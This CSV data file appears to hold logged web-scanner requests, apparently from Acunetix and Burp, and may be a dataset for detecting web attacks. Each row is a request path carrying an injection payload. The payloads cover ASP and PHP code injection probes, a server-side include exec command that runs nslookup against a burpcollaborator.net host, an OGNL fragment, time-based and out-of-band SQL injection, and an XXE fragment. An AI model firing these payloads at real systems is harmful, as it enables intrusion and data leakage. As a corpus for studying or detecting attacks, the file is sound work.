requestUrl,encoder,mode_is
/,0,0
"/""+response.write(9866711*9157950)+""/static/js/manifest.3ad1d5771e9b13dbdad2.js",1,0
"/""+response.write(9900146*9770446)+""/static/js/vendor.5013bbedf6c0508d32c2.js",2,0
"/""+response.write(9997327*9985621)+""/js/app.8673862912f22bcced43.js",3,0
"/""-->'-->`--><!--#set var=""nr1"" value=""mq0qy6rppg""--><!--#set var=""pt3"" value=""os2s08trri""--><!--#echo var=""nr1""--><!--#echo var=""pt3""--><!--#exec cmd=""nslookup -q=cname 9dndltecc3zr5q380i6wkd0zwq2kqge8cw9jz7o.burpcollaborator.net"" -->/sendVerifyCode/getVerifyCode",4,0
"/"";print(md5(acunetix_wvs_security_test));$a=""/js/app.8673862912f22bcced43.js",5,0
/%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess,6,0
/'+response.write(9319899*9453833)+'/static/js/manifest.3ad1d5771e9b13dbdad2.js,7,0
/'+response.write(9629950*9638728)+'/static/js/app.8673862912f22bcced43.js,8,0
/'+response.write(9866711*9157950)+'/static/js/manifest.3ad1d5771e9b13dbdad2.js,9,0
/'+response.write(9900146*9770446)+'/static/js/vendor.5013bbedf6c0508d32c2.js,10,0
/';print(md5(acunetix_wvs_security_test));$a='/js/app.8673862912f22bcced43.js,11,0
/';print(md5(acunetix_wvs_security_test));$a='/static/js/app.8673862912f22bcced43.js,12,0
/';print(md5(acunetix_wvs_security_test));$a='/static/js/manifest.3ad1d5771e9b13dbdad2.js,13,0
/(select extractvalue(xmltype('<,14,0
/(select load_file('\\\\kvjo34wnueh2n1ljito72oiae1kv8xwoycvzlna.burpcollaborator.net\\upx'))/sendVerifyCode/getVerifyCode,15,0
"/(select(0)from(select(sleep(3)))v)/*'+(select(0)from(select(sleep(3)))v)+'""+(select(0)from(select(sleep(3)))v)+""*//js/app.8673862912f22bcced43.js",16,0
"/(select(0)from(select(sleep(3)))v)/*'+(select(0)from(select(sleep(3)))v)+'""+(select(0)from(select(sleep(3)))v)+""*//js/vendor.5013bbedf6c0508d32c2.js",17,0
"/(select(0)from(select(sleep(3)))v)/*'+(select(0)from(select(sleep(3)))v)+'""+(select(0)from(select(sleep(3)))v)+""*//static/js/app.8673862912f22bcced43.js",18,0
"/(select(0)from(select(sleep(3)))v)/*'+(select(0)from(select(sleep(3)))v)+'""+(select(0)from(select(sleep(3)))v)+""*//static/js/vendor.5013bbedf6c0508d32c2.js",19,0
